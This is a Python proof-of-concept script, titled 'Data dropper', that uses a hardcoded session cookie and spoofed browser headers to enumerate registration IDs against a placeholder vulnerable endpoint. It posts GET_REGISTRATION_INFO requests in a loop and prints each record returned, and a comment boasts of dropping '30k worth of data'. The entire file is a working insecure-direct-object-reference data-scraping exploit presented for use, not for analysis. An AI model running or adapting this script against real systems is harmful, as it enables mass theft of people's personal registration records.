import requests
import json
import time
import termcolor
import colorama

from termcolor import colored
colorama.init()

banner = r'''
      
                            .d$$b
                          .' TO$;\
                         /  : TP._;
                        / _.;  :Tb|
                       /   /   ;j$j
                   _.-"       d$$$$
                 .' ..       d$$$$;
                /  /P'      d$$$$P. |\
               /   "      .d$$$P' |\^"l
             .'           `T$P^"""""  :
         ._.'      _.'                ;
      `-.-".-'-' ._.       _.-"    .-"
    `.-" ___  ._              .-"
   -(.g$$$$$$$b.              .'
     ""^^T$$$P^)            ..-"
       _/  -"  /.'         /:/;         Data dropper
    ._.'-'`-'  ")/         /;/;         POC by:0slo
 `-.-"..--""   " /         /  ;
.-" ..--""        -'          :
..--""--.-"         (\      .-(\
  ..--""              -\(\/;
    _.                      :
                            ;`-
                            ;
                           ;  

    '''

    
# Replace with the vulnerable URL
# target_link = ""

session = requests.Session()
session.cookies.set('PHPSESSID', 'oh2qj8vuo8b1o3rkf2gqctf8lg')
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'application/json, text/javascript, /; q=0.01',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest'
})

# uncomment this to drop 30k worth of data

# start_reg_id = 60470  # starting limit
# end_reg_id = 62999 # max limit 63000


print(banner)
print(colored("Starting data extraction...", "green"))
time.sleep(3)
for reg_id in range(start_reg_id, end_reg_id + 1):
    params = {
        'type': 'GET_REGISTRATION_INFO',
        'reg_id': reg_id,
        'lvl_id': 2,
        'yr_id': 16,
        'prd_id': 6
    }

    try:
        response = session.post(target_link, params=params)
        print(f"reg_id: {reg_id}, Status Code: {response.status_code}, Response: {json.dumps(response.json(), indent=2)}")
    except session.exceptions.RequestException as e:
        print(f"Error with reg_id {reg_id}: {e}")